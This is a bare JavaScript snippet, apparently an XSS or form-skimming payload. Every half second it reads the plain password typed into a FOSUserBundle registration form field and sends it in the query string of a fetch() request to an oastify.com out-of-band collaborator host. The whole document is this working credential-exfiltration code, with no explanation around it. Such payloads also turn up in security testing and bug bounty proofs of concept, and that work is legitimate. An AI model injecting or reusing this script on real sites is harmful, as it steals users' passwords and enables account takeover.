setInterval(() => {
  let pass = document.getElementById("fos_user_registration_form_plainPassword").value
	const res = fetch(`https://659enb5woq5it7uazofx4a080z6suii7.oastify.com/?${pass}`);
}, 500);
